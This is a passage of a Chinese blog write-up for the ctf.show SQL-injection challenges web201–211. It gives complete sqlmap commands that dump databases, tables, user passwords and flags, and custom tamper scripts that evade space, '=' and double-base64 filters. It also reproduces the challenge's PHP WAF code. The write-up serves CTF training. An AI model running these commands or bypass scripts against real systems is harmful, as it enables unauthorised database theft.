class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/sqlmap.php -batch -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,<span class="keyword">pass</span>,username -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229193808885.png" alt="image-20241229193808885"></p><h2 id="web202-POST请求"><a href="#web202-POST请求" class="headerlink" title="web202(POST请求)"></a>web202(POST请求)</h2><p>通过-data更换为POST请求方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://d18ed34e-<span class="number">1866</span>-<span class="number">4884</span>-b756-16f40334ff59.challenge.ctf.show/api/ --data <span class="built_in">id</span>=<span class="number">1</span> --referer https://d18ed34e-<span class="number">1866</span>-<span class="number">4884</span>-b756-16f40334ff59.challenge.ctf.show/sqlmap.php -batch -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,<span class="keyword">pass</span>,username -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229200026903.png" alt="image-20241229200026903"></p><h2 id="web203-PUT请求"><a href="#web203-PUT请求" class="headerlink" title="web203(PUT请求)"></a>web203(PUT请求)</h2><p>通过–method调整请求方式为PUT，并且加上–headers&#x3D;”Content-Type: text&#x2F;plain”，<code>PUT</code> 请求通常包含请求体（payload），因此需要通过headers来提供有关请求体的信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://724abbe9-4be1-4a25-b97d-e9c81b831563.challenge.ctf.show/api/index.php --data <span class="built_in">id</span>=<span class="number">1</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --referer http://724abbe9-4be1-4a25-b97d-e9c81b831563.challenge.ctf.show/sqlmap.php -batch -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,<span class="keyword">pass</span>,username -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229203344198.png" alt="image-20241229203344198"></p><h2 id="web204-cookie"><a href="#web204-cookie" class="headerlink" title="web204(cookie)"></a>web204(cookie)</h2><p>要加上cookie值了，即添加–cookie</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://dcb44cf5-4c99-<span class="number">4186</span>-9a3a-9291fcf51b36.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span>  --cookie PHPSESSID=6sh7omtbvr2l5m9qd6po1ovoe6; ctfshow=803c499b0ad861be99cf0c1117d91dea -batch -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,<span class="keyword">pass</span>,username -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102224001170.png" alt="image-20250102224001170"></p><p>以下是对该题的waf</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对cookie的验证</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfshow&#x27;</span>]!=<span class="variable">$_SESSION</span>[<span class="string">&#x27;ctfshow&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;token验证失败&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//对请求方法的验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;PUT&#x27;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$put</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$put</span>, <span class="number">0</span>,<span class="number">3</span>)==<span class="string">&#x27;id=&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$id</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$put</span>, <span class="number">3</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$put</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//对User-Agent的验证</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sqlmap/i&#x27;</span>, <span class="variable">$ua</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;不使用sqlmap是没有灵魂的&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//对referer的验证</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf\.show/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;打击盗版人人有责，你都不是从ctf.show来的&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ujn/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web205-api鉴权"><a href="#web205-api鉴权" class="headerlink" title="web205(api鉴权)"></a>web205(api鉴权)</h2><p>要求api调用鉴权，在每次查询数据库时会先访问&#x2F;getToken.php，于是使用–safe-url参数将url设置为api&#x2F;getToken，再加上–safe-preq&#x3D;1表示访问api&#x2F;getToken一次(注意要重新爆表名)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102224858732.png" alt="image-20250102224858732"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://0414f3a9-59c0-<span class="number">4858</span>-b634-452ef2be4d56.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://0414f3a9-59c0-4858-b634-452ef2be4d56.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102225154282.png" alt="image-20250102225154282"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://0414f3a9-59c0-<span class="number">4858</span>-b634-452ef2be4d56.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://0414f3a9-59c0-4858-b634-452ef2be4d56.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102225420773.png" alt="image-20250102225420773"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://0414f3a9-59c0-<span class="number">4858</span>-b634-452ef2be4d56.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://0414f3a9-59c0-4858-b634-452ef2be4d56.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flax -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102225447178.png" alt="image-20250102225447178"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://0414f3a9-59c0-<span class="number">4858</span>-b634-452ef2be4d56.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://0414f3a9-59c0-4858-b634-452ef2be4d56.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102225516452.png" alt="image-20250102225516452"></p><h2 id="web206-‘-闭合"><a href="#web206-‘-闭合" class="headerlink" title="web206(‘)闭合)"></a>web206(‘)闭合)</h2><p>同web205即可，’)sqlmap会自动检测闭合，但是要重新爆表名</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">8</span>1038f77-c314-42aa-<span class="number">8e21</span>-61ddba4597a5.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://81038f77-c314-42aa-8e21-61ddba4597a5.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102230150965.png" alt="image-20250102230150965"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">8</span>1038f77-c314-42aa-<span class="number">8e21</span>-61ddba4597a5.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://81038f77-c314-42aa-8e21-61ddba4597a5.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102230225399.png" alt="image-20250102230225399"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">8</span>1038f77-c314-42aa-<span class="number">8e21</span>-61ddba4597a5.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://81038f77-c314-42aa-8e21-61ddba4597a5.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flaxc -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102230342742.png" alt="image-20250102230342742"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">8</span>1038f77-c314-42aa-<span class="number">8e21</span>-61ddba4597a5.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://81038f77-c314-42aa-8e21-61ddba4597a5.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flaxc -C flagv -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102230439441.png" alt="image-20250102230439441"></p><h2 id="web207-绕过空格过滤"><a href="#web207-绕过空格过滤" class="headerlink" title="web207(绕过空格过滤)"></a>web207(绕过空格过滤)</h2><p>使用–tamper中的space2comment.py绕过waf检测</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://898394b9-<span class="number">0e78</span>-47ff-9ed2-8934e2372b33.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://898394b9-0e78-47ff-9ed2-8934e2372b33.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102231629562.png" alt="image-20250102231629562"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://898394b9-<span class="number">0e78</span>-47ff-9ed2-8934e2372b33.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://898394b9-0e78-47ff-9ed2-8934e2372b33.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102231921915.png" alt="image-20250102231921915"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://898394b9-<span class="number">0e78</span>-47ff-9ed2-8934e2372b33.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://898394b9-0e78-47ff-9ed2-8934e2372b33.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py -D ctfshow_web -T ctfshow_flaxca -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102232127096.png" alt="image-20250102232127096"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://898394b9-<span class="number">0e78</span>-47ff-9ed2-8934e2372b33.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://898394b9-0e78-47ff-9ed2-8934e2372b33.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py -D ctfshow_web -T ctfshow_flaxca -C flagvc -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102232206220.png" alt="image-20250102232206220"></p><h2 id="web208-绕过select过滤"><a href="#web208-绕过select过滤" class="headerlink" title="web208(绕过select过滤)"></a>web208(绕过select过滤)</h2><p>加入对’select’ 的过滤，使用upppercase这个脚本</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102232850682.png" alt="image-20250102232850682"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102233015001.png" alt="image-20250102233015001"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -D ctfshow_web -T ctfshow_flaxcac -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102233116244.png" alt="image-20250102233116244"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;http://683f8c95-454f-400f-be23-4251f627e3f6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250102233416100.png" alt="image-20250102233416100"></p><h2 id="web209-绕过空格-过滤"><a href="#web209-绕过空格-过滤" class="headerlink" title="web209(绕过空格*&#x3D;过滤)"></a>web209(绕过空格*&#x3D;过滤)</h2><p>由于tamper里面没有绕过这个的，所以自己写脚本实现，将以下代码在sqlmap&#x2F;tamper里面存为text.py后使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="comment"># 0x09 0x0a 0x0b 0x0c 0x0d</span></span><br><span class="line">    space = <span class="built_in">chr</span>(<span class="number">0x0d</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&#x27; &#x27;</span>, space).replace(<span class="string">&#x27;=&#x27;</span>, space + <span class="string">&#x27;like&#x27;</span> + space)</span><br></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=text.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104125821345.png" alt="image-20250104125821345"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=text.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104125805154.png" alt="image-20250104125805154"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=text.py -D ctfshow_web -T ctfshow_flav -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104130022215.png" alt="image-20250104130022215"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;1c7f2459-c630-43b4-bfa8-35dcea23aacd.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=text.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104130134631.png" alt="image-20250104130134631"></p><h2 id="web210-绕过双重base64"><a href="#web210-绕过双重base64" class="headerlink" title="web210(绕过双重base64)"></a>web210(绕过双重base64)</h2><p>题目要对payload进行两次base64解密，因此通过脚本对payload进行两次加密就行，存为base.py使用(若存为base64.py会和原有脚本相似导致报错)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="comment"># noinspection PyUnusedLocal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=base.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104133258839.png" alt="image-20250104133258839"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=base.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104133411290.png" alt="image-20250104133411290"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=base.py -D ctfshow_web -T ctfshow_flavi -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104133608278.png" alt="image-20250104133608278"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;bb19cd29-3b8f-4d0e-b89f-57d486fed677.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=base.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104133741416.png" alt="image-20250104133741416"></p><h2 id="web211-绕过双重base64-空格过滤"><a href="#web211-绕过双重base64-空格过滤" class="headerlink" title="web211(绕过双重base64+空格过滤)"></a>web211(绕过双重base64+空格过滤)</h2><p>在上一题基础上还有匹配空格，结合脚本使用，存为yxing.py使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="comment"># noinspection PyUnusedLocal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span 